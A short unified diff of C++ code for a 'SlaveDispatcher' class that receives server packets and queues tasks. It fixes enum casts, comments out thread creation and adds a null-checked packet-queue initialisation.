@@ -66,7 +66,7 @@ DWORD __stdcall SlaveDispatcher::ReceiveThread(LPVOID lpv)
 
 											MSFPacket* pACKPacket =
 												new MSFPacket(EPACKET::PacketType::ResponsePacket,
-													pPacket->getSlaveId(), EPACKET::RESP::SLAVE_MASTER_OK_RESPONSE,
+													pPacket->getSlaveId(), (unsigned int)EPACKET::RESP::SLAVE_MASTER_OK_RESPONSE,
 													(unsigned char*)buf);
 
 											if (pACKPacket)
@@ -81,7 +81,7 @@ DWORD __stdcall SlaveDispatcher::ReceiveThread(LPVOID lpv)
 										case EPACKET::PacketType::TaskPacket:
 										{
 											//Push new task to taskexecutor
-											Task* pTask = new Task((ETASK::Task)pPacket->getOpCode());
+											Task* pTask = new Task((EPACKET::Task)pPacket->getOpCode());
 											if (pTask)
 											{
 												pTaskExecutor->SecurePushBack(pTask);
@@ -266,7 +266,7 @@ void SlaveDispatcher::Connect()
 				DEBUG_PRINT("Connected to server!\n");
 				this->m_bConnected = true;
 
-				this->CreateDispatcherThreads();
+				//this->CreateDispatcherThreads();
 
 				break;
 			}
@@ -300,10 +300,13 @@ void SlaveDispatcher::SecureQueuePushBack(MSFPacket* pPacket)
 }
 
 SlaveDispatcher::SlaveDispatcher() :
-	PacketDispatcher(), m_bConnected(false), m_pTaskExecutor(nullptr),
+	PacketDispatcher(), m_bConnected(false), m_pTaskExecutor(nullptr), m_pPacketQueue(nullptr),
 	m_hReceiveThread(INVALID_HANDLE_VALUE), m_hSendThread(INVALID_HANDLE_VALUE)
 {
-	this->m_pPacketQueue = new MSFPacketQueue();
+	if (!this->m_pPacketQueue)
+	{
+		this->m_pPacketQueue = new MSFPacketQueue();
+	}
 }
 
 struct ThreadArgs
